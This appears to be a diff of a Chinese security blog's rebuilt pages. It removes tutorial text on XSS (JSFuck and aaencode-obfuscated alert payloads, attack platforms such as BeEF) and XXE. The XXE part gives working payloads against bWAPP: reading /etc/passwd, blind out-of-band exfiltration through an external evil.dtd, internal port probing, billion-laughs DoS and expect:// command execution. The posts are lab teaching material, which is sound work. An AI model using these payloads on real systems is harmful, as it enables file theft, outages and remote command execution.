-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]][([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]]((![]+[])[+!+[]]+(![]+[])[!+[]+!+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]+(!![]+[])[+[]]+(![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[!+[]+!+[]+[+[]]]+(+(+!+[]+[+[]]+[+!+[]]))[(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+(+![]+([]+[])[([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([![]]+[][[]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(+![]+[![]]+([]+[])[([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]])[!+[]+!+[]+[+[]]]](!+[]+!+[]+!+[]+[!+[]+!+[]+!+[]+!+[]])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[!+[]+!+[]+[+[]]])()</span><br></pre></td></tr></table></figure>
-<h3 id="8-9-8-aaencode"><a href="#8-9-8-aaencode" class="headerlink" title="8.9.8 aaencode"></a>8.9.8 aaencode</h3><p>alert(/xss/)</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ﾟωﾟﾉ= /｀ｍ´）ﾉ ~┻━┻   //*´∇｀*/ [&apos;_&apos;]; o=(ﾟｰﾟ)  =_=3; c=(ﾟΘﾟ) =(ﾟｰﾟ)-(ﾟｰﾟ); (ﾟДﾟ) =(ﾟΘﾟ)= (o^_^o)/ (o^_^o);(ﾟДﾟ)=&#123;ﾟΘﾟ: &apos;_&apos; ,ﾟωﾟﾉ : ((ﾟωﾟﾉ==3) +&apos;_&apos;) [ﾟΘﾟ] ,ﾟｰﾟﾉ :(ﾟωﾟﾉ+ &apos;_&apos;)[o^_^o -(ﾟΘﾟ)] ,ﾟДﾟﾉ:((ﾟｰﾟ==3) +&apos;_&apos;)[ﾟｰﾟ] &#125;; (ﾟДﾟ) [ﾟΘﾟ] =((ﾟωﾟﾉ==3) +&apos;_&apos;) [c^_^o];(ﾟДﾟ) [&apos;c&apos;] = ((ﾟДﾟ)+&apos;_&apos;) [ (ﾟｰﾟ)+(ﾟｰﾟ)-(ﾟΘﾟ) ];(ﾟДﾟ) [&apos;o&apos;] = ((ﾟДﾟ)+&apos;_&apos;) [ﾟΘﾟ];(ﾟoﾟ)=(ﾟДﾟ) [&apos;c&apos;]+(ﾟДﾟ) [&apos;o&apos;]+(ﾟωﾟﾉ +&apos;_&apos;)[ﾟΘﾟ]+ ((ﾟωﾟﾉ==3) +&apos;_&apos;) [ﾟｰﾟ] + ((ﾟДﾟ) +&apos;_&apos;) [(ﾟｰﾟ)+(ﾟｰﾟ)]+ ((ﾟｰﾟ==3) +&apos;_&apos;) [ﾟΘﾟ]+((ﾟｰﾟ==3) +&apos;_&apos;) [(ﾟｰﾟ) - (ﾟΘﾟ)]+(ﾟДﾟ) [&apos;c&apos;]+((ﾟДﾟ)+&apos;_&apos;) [(ﾟｰﾟ)+(ﾟｰﾟ)]+ (ﾟДﾟ) [&apos;o&apos;]+((ﾟｰﾟ==3) +&apos;_&apos;) [ﾟΘﾟ];(ﾟДﾟ) [&apos;_&apos;] =(o^_^o) [ﾟoﾟ] [ﾟoﾟ];(ﾟεﾟ)=((ﾟｰﾟ==3) +&apos;_&apos;) [ﾟΘﾟ]+ (ﾟДﾟ) .ﾟДﾟﾉ+((ﾟДﾟ)+&apos;_&apos;) [(ﾟｰﾟ) + (ﾟｰﾟ)]+((ﾟｰﾟ==3) +&apos;_&apos;) [o^_^o -ﾟΘﾟ]+((ﾟｰﾟ==3) +&apos;_&apos;) [ﾟΘﾟ]+ (ﾟωﾟﾉ +&apos;_&apos;) [ﾟΘﾟ]; (ﾟｰﾟ)+=(ﾟΘﾟ); (ﾟДﾟ)[ﾟεﾟ]=&apos;\\&apos;; (ﾟДﾟ).ﾟΘﾟﾉ=(ﾟДﾟ+ ﾟｰﾟ)[o^_^o -(ﾟΘﾟ)];(oﾟｰﾟo)=(ﾟωﾟﾉ +&apos;_&apos;)[c^_^o];(ﾟДﾟ) [ﾟoﾟ]=&apos;\&quot;&apos;;(ﾟДﾟ) [&apos;_&apos;] ( (ﾟДﾟ) [&apos;_&apos;] (ﾟεﾟ+(ﾟДﾟ)[ﾟoﾟ]+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ (ﾟΘﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟｰﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((o^_^o) +(o^_^o))+ ((o^_^o) - (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((o^_^o) +(o^_^o))+ (ﾟｰﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+ (c^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟｰﾟ)+ ((o^_^o) - (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (o^_^o))+ (c^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((o^_^o) +(o^_^o))+ (o^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((o^_^o) +(o^_^o))+ (o^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟｰﾟ)+ ((o^_^o) - (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟΘﾟ)+ (ﾟДﾟ)[ﾟoﾟ]) (ﾟΘﾟ)) (&apos;_&apos;);</span><br></pre></td></tr></table></figure>
-<h1 id="9-XSS练习"><a href="#9-XSS练习" class="headerlink" title="9. XSS练习"></a>9. XSS练习</h1><p>1.<a href="http://prompt.ml/" target="_blank" rel="noopener">prompt(1) to win</a></p>
-<p>2.<a href="https://alf.nu/alert1" target="_blank" rel="noopener">alert(1) to win</a></p>
-<p>3.<a href="https://github.com/r00tuser111/xianzhi_xss" target="_blank" rel="noopener">先知社区xss挑战</a></p>
-<h1 id="10-XSS平台"><a href="#10-XSS平台" class="headerlink" title="10. XSS平台"></a>10. XSS平台</h1><h2 id="BeEF"><a href="#BeEF" class="headerlink" title="BeEF"></a>BeEF</h2><h2 id="XSS-Exploit-框架-Xenotix"><a href="#XSS-Exploit-框架-Xenotix" class="headerlink" title="XSS Exploit 框架 Xenotix"></a>XSS Exploit 框架 Xenotix</h2><h2 id="BlueLotus"><a href="#BlueLotus" class="headerlink" title="BlueLotus"></a>BlueLotus</h2><h2 id="XSS-Platform"><a href="#XSS-Platform" class="headerlink" title="XSS_Platform"></a>XSS_Platform</h2><h2 id="XSSer"><a href="#XSSer" class="headerlink" title="XSSer"></a>XSSer</h2><h2 id="XSSpt"><a href="#XSSpt" class="headerlink" title="XSSpt"></a>XSSpt</h2><h1 id="11-参考"><a href="#11-参考" class="headerlink" title="11. 参考"></a>11. 参考</h1><p>[1] <a href="https://thief.one/2017/05/31/1/" target="_blank" rel="noopener">浅谈跨站脚本攻击与防御</a></p>
-<p>[2] <a href="https://www.fooying.com/the-art-of-xss-1-introduction/#%E4%BB%80%E4%B9%88%E6%98%AFxss" target="_blank" rel="noopener">跨站的艺术-XSS入门与介绍</a></p>
-<p>[3] <a href="http://utf-8.jp/public/aaencode.html" target="_blank" rel="noopener">aaencode demo</a></p>
-<p>[4] <a href="http://www.jsfuck.com" target="_blank" rel="noopener">http://www.jsfuck.com</a></p>
-
+            <div class="post-button text-center">
+              <a class="btn" href="/2019/05/10/XSS/#more" rel="contents">
+                Read more &raquo;
+              </a>
+            </div>
           
+          <!--/noindex-->
         
       
     </div>
@@ -988,57 +815,18 @@
 
       
         
-          
-            <h1 id="1-XML基础"><a href="#1-XML基础" class="headerlink" title="1. XML基础"></a>1. XML基础</h1><h2 id="1-1-XML结构"><a href="#1-1-XML结构" class="headerlink" title="1.1 XML结构"></a>1.1 XML结构</h2><p>XML由3部分构成，XML声明，文档定义(Document Type Definition,DTD)，文档元素。</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">&lt;!--XML申明--&gt;</span><br><span class="line">&lt;?xml version=&quot;1.0&quot; ?&gt; </span><br><span class="line">&lt;!--文档类型定义--&gt;</span><br><span class="line">&lt;!DOCTYPE note [  &lt;!--定义此文档是 note 类型的文档--&gt;</span><br><span class="line">&lt;!ELEMENT note (to,from,heading,body)&gt;  &lt;!--定义note元素有四个元素--&gt;</span><br><span class="line">&lt;!ELEMENT to (#PCDATA)&gt;</span><br><span class="line">&lt;!ELEMENT from (#PCDATA)&gt;</span><br><span class="line">&lt;!ELEMENT head (#PCDATA)&gt;</span><br><span class="line">&lt;!ELEMENT body (#PCDATA)&gt;</span><br><span class="line">]]]&gt;</span><br><span class="line">&lt;!--文档元素--&gt;</span><br><span class="line">&lt;note&gt;</span><br><span class="line">&lt;to&gt;Windy&lt;/to&gt;</span><br><span class="line">&lt;from&gt;Andy&lt;/from&gt;</span><br><span class="line">&lt;head&gt;Greeting&lt;/head&gt;</span><br><span class="line">&lt;body&gt;Long time no see!&lt;/body&gt;</span><br><span class="line">&lt;/note&gt;</span><br></pre></td></tr></table></figure>
-<h2 id="1-2-DTD"><a href="#1-2-DTD" class="headerlink" title="1.2 DTD"></a>1.2 DTD</h2><h3 id="1-2-1-DTD文档形式"><a href="#1-2-1-DTD文档形式" class="headerlink" title="1.2.1 DTD文档形式"></a>1.2.1 DTD文档形式</h3><h4 id="1-2-1-1-内部DTD文档"><a href="#1-2-1-1-内部DTD文档" class="headerlink" title="1.2.1.1 内部DTD文档"></a>1.2.1.1 内部DTD文档</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE 根元素 [定义内容]&gt;</span><br></pre></td></tr></table></figure>
-<h4 id="1-2-1-2-外部DTD文档"><a href="#1-2-1-2-外部DTD文档" class="headerlink" title="1.2.1.2 外部DTD文档"></a>1.2.1.2 外部DTD文档</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE 根元素 SYSTEM &quot;DTD文件路径&quot;&gt;</span><br></pre></td></tr></table></figure>
-<h4 id="1-2-1-3-混合类型"><a href="#1-2-1-3-混合类型" class="headerlink" title="1.2.1.3 混合类型"></a>1.2.1.3 混合类型</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE 根元素 SYSTEM &quot;DTD文件路径&quot; [定义内容]&gt;</span><br></pre></td></tr></table></figure>
-<h3 id="1-2-2-实体类别"><a href="#1-2-2-实体类别" class="headerlink" title="1.2.2 实体类别"></a>1.2.2 实体类别</h3><h4 id="1-2-2-1-内部普通实体"><a href="#1-2-2-1-内部普通实体" class="headerlink" title="1.2.2.1 内部普通实体"></a>1.2.2.1 内部普通实体</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ENTITY 实体名称 &quot;实体值&quot;&gt;</span><br></pre></td></tr></table></figure>
-<h4 id="1-2-2-2-外部普通实体"><a href="#1-2-2-2-外部普通实体" class="headerlink" title="1.2.2.2 外部普通实体"></a>1.2.2.2 外部普通实体</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ENTITY 实体名称 SYSTEM &quot;URI&quot;</span><br></pre></td></tr></table></figure>
-<h4 id="1-2-2-3-内部参数实体"><a href="#1-2-2-3-内部参数实体" class="headerlink" title="1.2.2.3 内部参数实体"></a>1.2.2.3 内部参数实体</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ENTITY % 实体名称 &quot;实体值&quot;&gt;</span><br></pre></td></tr></table></figure>
-<h4 id="1-2-2-4-外部参数实体"><a href="#1-2-2-4-外部参数实体" class="headerlink" title="1.2.2.4 外部参数实体"></a>1.2.2.4 外部参数实体</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ENTITY % 实体名称 SYSTEM &quot;URI&quot;&gt;</span><br></pre></td></tr></table></figure>
-<h3 id="1-2-2-Example"><a href="#1-2-2-Example" class="headerlink" title="1.2.2 Example"></a>1.2.2 Example</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; ?&gt;</span><br><span class="line">&lt;!DOCTYPE xxe [</span><br><span class="line">&lt;!ENTITY data SYSTEM &quot;file:///etc/passwd&quot;&gt;</span><br><span class="line">]&gt;</span><br><span class="line">&lt;root&gt;</span><br><span class="line">	&lt;data&gt;&amp;data;&lt;/data&gt;</span><br><span class="line">&lt;/root&gt;</span><br></pre></td></tr></table></figure>
-<p>普通实体使用<code>&amp;实体名;</code>来进行引用；<br>参数实体只能在定义种出现。</p>
-<h1 id="2-漏洞利用"><a href="#2-漏洞利用" class="headerlink" title="2. 漏洞利用"></a>2. 漏洞利用</h1><h2 id="2-1-读取任意文件"><a href="#2-1-读取任意文件" class="headerlink" title="2.1 读取任意文件"></a>2.1 读取任意文件</h2><h3 id="2-1-1-探测XXE漏洞"><a href="#2-1-1-探测XXE漏洞" class="headerlink" title="2.1.1 探测XXE漏洞"></a>2.1.1 探测XXE漏洞</h3><p>以bWAPP的XXE漏洞为例</p>
-<p>抓包发现，返回数据格式是xml格式</p>
-<p>&lt;%asset_img XXE/02.01.01.XXE_Detect.png%&gt;</p>
-<p>Payload</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; ?&gt;</span><br><span class="line">&lt;!DOCTYPE xxe [</span><br><span class="line">&lt;!ENTITY data SYSTEM &quot;file:///etc/passwd&quot;&gt;</span><br><span class="line">]&gt;</span><br><span class="line">&lt;reset&gt;&lt;login&gt;&amp;data;&lt;/login&gt;&lt;secret&gt;Any bugs?&lt;/secret&gt;&lt;/reset&gt;</span><br></pre></td></tr></table></figure>
-<p>&lt;%asset_img XXE/02.01.02.XXE_Result.png%&gt;</p>
-<h2 id="2-2-URL请求"><a href="#2-2-URL请求" class="headerlink" title="2.2 URL请求"></a>2.2 URL请求</h2><h3 id="2-2-1-Blind-XXE"><a href="#2-2-1-Blind-XXE" class="headerlink" title="2.2.1 Blind XXE"></a>2.2.1 Blind XXE</h3><p>在某些情况下，即使存在XXE漏洞，服务器并不会将数据回显。这种情况下，使用外带数据(Out Of Band, OOB)依然可以获得数据。</p>
-<p>test.php</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">	$xml = $_POST[<span class="string">'xml'</span>];</span><br><span class="line">	$data = @simplexml_load_string($xml);</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">"&lt;pre&gt;"</span>;</span><br><span class="line">	@print_r($data);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
-<p>XXE_OOB.php</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">	$xxe = $_GET[<span class="string">'xxe'</span>];</span><br><span class="line">	$log = fopen(<span class="string">'xxe.txt'</span>,<span class="string">'a+'</span>);</span><br><span class="line">	fwrite($log,$xxe);</span><br><span class="line">	fclose($log);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
-<p>evil.dtd</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ENTITY % all &quot;&lt;!ENTITY &amp;#x25; send SYSTEM &apos;http://localhost:8000/Blind_XXE/XXE_OOB.php?xxe=%file;&apos;&gt;&quot;&gt;%all;</span><br></pre></td></tr></table></figure>
-<p>test.txt</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hello!</span><br></pre></td></tr></table></figure>
-<p>payload</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">xml=&lt;?xml version=&quot;1.0&quot;?&gt;</span><br><span class="line">	&lt;!DOCTYPE ANY[</span><br><span class="line">	&lt;!ENTITY % remote SYSTEM &quot;http://localhost:8000/Blind_XXE/evil.dtd&quot;&gt;</span><br><span class="line">	&lt;!ENTITY % file SYSTEM &quot;php://filter/convert.base64-encode/resource=d:/test.txt&quot;&gt;</span><br><span class="line">	%remote;</span><br><span class="line">	%send;</span><br><span class="line">	]&gt;</span><br></pre></td></tr></table></figure>
-<p>访问test.php，将payload用post方式传入。<br>&lt;%asset_img XXE/02.02.01.01.XXE_OOB_POST.png%&gt;调用外部DTD文档<code>evil.dtd</code>，访问<code>XXE_OOB.php</code>，将数据写入<code>xxe.txt</code>文档中。<br>&lt;%asset_img XXE/02.02.01.02.XXE_OOB_Result.png%&gt;<br>也可以查看<code>access.log</code>获取数据。<br>&lt;%asset_img XXE/02.02.01.03.XXE_OOB_accesslog.png%&gt;</p>
-<p>数据<code>aGVsbG8h</code>经过Base64编码，解码后为<code>hello!</code></p>
-<p>&lt;%asset_img XXE/02.02.01.03.XXE_OOB_data.png%&gt;</p>
-<h3 id="2-2-2-内网探测"><a href="#2-2-2-内网探测" class="headerlink" title="2.2.2 内网探测"></a>2.2.2 内网探测</h3><h4 id="2-2-2-1-端口扫描"><a href="#2-2-2-1-端口扫描" class="headerlink" title="2.2.2.1 端口扫描"></a>2.2.2.1 端口扫描</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE ipconfig [</span><br><span class="line">&lt;!ENTITY xxe SYSTEM &quot;http://192.168.126.1&quot;&gt;</span><br><span class="line">]&gt;</span><br><span class="line">&lt;reset&gt;&lt;login&gt;&amp;xxe;&lt;/login&gt;&lt;secret&gt;Any bugs?&lt;/secret&gt;&lt;/reset&gt;</span><br></pre></td></tr></table></figure>
-<p>&lt;%asset_img XXE/02.02.02.01.internal_network_detect.png%&gt;</p>
-<h2 id="2-3-DOS拒绝服务"><a href="#2-3-DOS拒绝服务" class="headerlink" title="2.3 DOS拒绝服务"></a>2.3 DOS拒绝服务</h2><p>递归调用，占用大量服务器资源</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE DOS [</span><br><span class="line">&lt;!ENTITY DOS0 &quot;DOS&quot;&gt;</span><br><span class="line">&lt;!ENTITY DOS1 &quot;&amp;DOS0;&amp;DOS0;&amp;DOS0;&amp;DOS0;&amp;DOS0;&amp;DOS0;&quot;&gt;</span><br><span class="line">&lt;!ENTITY DOS2 &quot;&amp;DOS1;&amp;DOS1;&amp;DOS1;&amp;DOS1;&amp;DOS1;&amp;DOS1;&quot;&gt;</span><br><span class="line">&lt;!ENTITY DOS3 &quot;&amp;DOS2;&amp;DOS2;&amp;DOS2;&amp;DOS2;&amp;DOS2;&amp;DOS2;&quot;&gt;</span><br><span class="line">&lt;!ENTITY DOS4 &quot;&amp;DOS3;&amp;DOS3;&amp;DOS3;&amp;DOS3;&amp;DOS3;&amp;DOS3;&quot;&gt;</span><br><span class="line">&lt;!ENTITY DOS5 &quot;&amp;DOS4;&amp;DOS4;&amp;DOS4;&amp;DOS4;&amp;DOS4;&amp;DOS4;&quot;&gt;</span><br><span class="line">&lt;!ENTITY DOS6 &quot;&amp;DOS5;&amp;DOS5;&amp;DOS5;&amp;DOS5;&amp;DOS5;&amp;DOS5;&quot;&gt;</span><br><span class="line">&lt;!ENTITY DOS7 &quot;&amp;DOS6;&amp;DOS6;&amp;DOS6;&amp;DOS6;&amp;DOS6;&amp;DOS6;&quot;&gt;</span><br><span class="line">&lt;!ENTITY DOS8 &quot;&amp;DOS7;&amp;DOS7;&amp;DOS7;&amp;DOS7;&amp;DOS7;&amp;DOS7;&quot;&gt;</span><br><span class="line">&lt;!ENTITY DOS9 &quot;&amp;DOS8;&amp;DOS8;&amp;DOS8;&amp;DOS8;&amp;DOS8;&amp;DOS8;&quot;&gt;</span><br><span class="line">]&gt;</span><br><span class="line">&lt;DOS&gt;&amp;DOS9;&lt;/DOS&gt;</span><br></pre></td></tr></table></figure>
-<h2 id="2-4-远程代码执行"><a href="#2-4-远程代码执行" class="headerlink" title="2.4 远程代码执行"></a>2.4 远程代码执行</h2><p>当目标服务器安装了PHP expect模块，并且加载了该模块时，可以使用<code>expect</code>执行系统命令。</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE ipconfig [</span><br><span class="line">&lt;!ENTITY xxe SYSTEM &quot;expect://ifconfig&quot;&gt;</span><br><span class="line">]&gt;</span><br><span class="line">&lt;ipconfig&gt;&amp;xxe;&lt;/ipconfig&gt;</span><br></pre></td></tr></table></figure>
-<h1 id="3-XXE防御"><a href="#3-XXE防御" class="headerlink" title="3. XXE防御"></a>3. XXE防御</h1><blockquote>
-<p>The main problem is that the XML parser parses the untrusted data sent by the user. However, it may not be easy or possible to validate only data present within the system identifier in the DTD. Most XML parsers are vulnerable to XML external entity attacks (XXE) by default. Therefore, the best solution would be to configure the XML processor to use a local static DTD and disallow any declared DTD included in the XML document.</p>
-<p>From:<a href="https://blog.zsec.uk/blind-xxe-learning/" target="_blank" rel="noopener">HUNTING IN THE DARK - BLIND XXE</a></p>
+          <blockquote>
+<p>XML外部实体攻击是一种应用层攻击，攻击的前提是应用能够解析XML。XXE发生的场景通常是用户在XML输入中包含了外部实体引用，且该外部实体也能被错误配置的XML解析器解析。从解析器所在的主机角度来看，这种攻击可能会引起机密信息泄漏、拒绝服务攻击、服务器请求伪造、端口扫描和其他系统影响。</p>
 </blockquote>
-<p>XXE的主要问题是XML解析器解析了用户发送的不可信数据。然而，在DTD文档中验证带有系统标识符的数据并不现实。默认情况下，大多数XML解析器都容易遭受XXE攻击。所以，最好的解决办法是配置XML处理器仅使用本地静态DTD，同时禁止XML文档中的DTD声明。</p>
-<h1 id="4-参考"><a href="#4-参考" class="headerlink" title="4. 参考"></a>4. 参考</h1><p>[1] <a href="https://www.cnblogs.com/backlion/p/9302528.html" target="_blank" rel="noopener">XML外部实体（XXE）注入详解</a></p>
-<p>[2] <a href="https://www.secpulse.com/archives/58915.html" target="_blank" rel="noopener">XXE攻击指南</a></p>
-<p>[3] <a href="https://thief.one/2017/06/20/1/" target="_blank" rel="noopener">浅谈XXE漏洞攻击与防御</a></p>
